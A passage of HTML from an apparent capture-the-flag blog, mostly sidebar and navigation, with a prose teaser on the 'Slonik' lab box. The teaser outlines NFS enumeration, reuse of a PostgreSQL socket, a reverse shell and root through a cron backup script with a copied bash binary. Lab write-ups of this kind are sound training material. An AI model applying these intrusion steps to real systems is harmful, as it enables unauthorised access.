REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS...</div></div></div></a><a class="pagination-related" href="/2024/12/04/Slonik/" title="Slonik (Linux Medium)"><img class="cover" src="/img/slonik.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Slonik (Linux Medium)</div></div><div class="info-2"><div class="info-item-1"> Slonik is a linux box created around reusing a socket and the ability to port forward them. It starts with a box running NFS, and using showmount our able to see two. There is /var/backups, and /home. Home was interesting, with there being a .bash_history and a .psql_history to see that we have commands previously ran. Using rpcinfo you can see we have sockets being used. From the information we have we can create a directory /tmp/sock and us it and the ending pid in the .bash_history. Using ssh we can connect using the socket created by postgres. Once connected we can get a reverse shell using a POC from hacktricks. Once getting a shell, we run pspy64 to see a script running from cron /usr/bin/backup. This script will back up everything postgres HOME directory. By copying /usr/bin/bash to our HOME directory in main. Then giving it the sticky bit and making it executable we can get root. Initial Nmap1234PORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 63111/tcp ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping üîêüîê</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Port-3000-Grafana"><span class="toc-number">2.</span> <span class="toc-text">HTTP (Port 3000 - Grafana)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-boris"><span class="toc-number">3.</span> <span class="toc-text">Shell as boris</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">Docker PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>